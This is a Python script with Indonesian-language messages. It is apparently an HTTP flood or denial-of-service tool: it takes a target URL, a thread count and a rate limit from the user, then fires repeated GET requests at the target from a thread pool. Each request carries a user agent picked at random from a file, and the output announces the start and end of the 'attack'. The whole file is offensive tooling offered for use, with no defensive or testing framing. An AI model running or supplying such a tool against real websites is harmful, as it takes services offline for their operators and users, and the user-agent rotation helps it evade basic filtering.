import os
import sys
import time
import random
import requests
import threading
import colorama
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# Konfigurasi
TARGET_URL = ""
NUM_THREADS = 0
RATE_LIMIT = 0
USER_AGENT_FILE = "user_agents.txt"

# Load user agents
def load_user_agents(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"Tidak ditemukan file user agent: {file_path}")
        sys.exit(1)

# Fungsi untuk mengirim request
def send_request(url, user_agent):
    headers = {"User-Agent": user_agent}
    try:
        response = requests.get(url, headers=headers)
        if response.status_code >= 200 and response.status_code < 300:
            print(f"\033[92mSend Request: {url}\033[0m")
        else:
            print(f"\033[91mFailed Request: {url} ({response.status_code})\033[0m")
    except requests.exceptions.RequestException as e:
        print(f"\033[91mFailed Request: {url} ({e})\033[0m")

# Fungsi untuk menjalankan worker
def worker(url, user_agents, num_requests):
    for _ in range(num_requests):
        user_agent = random.choice(user_agents)
        send_request(url, user_agent)
        time.sleep(RATE_LIMIT / 1000)

# Fungsi untuk menjalankan pool worker
def worker_pool(url, num_threads, num_requests, user_agents):
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for _ in range(num_threads):
            futures.append(executor.submit(worker, url, user_agents, num_requests))
        for future in futures:
            future.result()

# Fungsi utama
def main():
    global TARGET_URL, NUM_THREADS, RATE_LIMIT
    print("""
    \033[91m
╔╔ ╔═╝╔╔ ╔═╝║ ║
║║║╔═╝║║║╔═╝═╔╝
╝╝╝══╝╝╝╝══╝ ╝ 
    \033[0m
    """)
    TARGET_URL = input("target URL: ")
    if not TARGET_URL:
        print("Masukkan URL dengan benar")
        sys.exit(1)
    NUM_THREADS = int(input("threads: "))
    if NUM_THREADS <= 0:
        print("Threads harus lebih besar dari 0")
        sys.exit(1)
    rate_limit_input = input("rate limit (ex: 100ms): ")
    if rate_limit_input.endswith('ms'):
        RATE_LIMIT = int(rate_limit_input[:-2])
    elif rate_limit_input.endswith('s'):
        RATE_LIMIT = int(rate_limit_input[:-1]) * 1000
    else:
        RATE_LIMIT = int(rate_limit_input)
    if RATE_LIMIT <= 0:
        print("Rate limit harus lebih besar dari 0")
        sys.exit(1)
    user_agents = load_user_agents(USER_AGENT_FILE)
    if not user_agents:
        print("User agent list kosong")
        sys.exit(1)
    print(f"Starting attack pada {TARGET_URL} dengan {NUM_THREADS} threads")
    start_time = datetime.now()
    worker_pool(TARGET_URL, NUM_THREADS, 100, user_agents)
    end_time = datetime.now()
    print(f"Attack selesai dalam {end_time - start_time}")

if __name__ == "__main__":
    main()
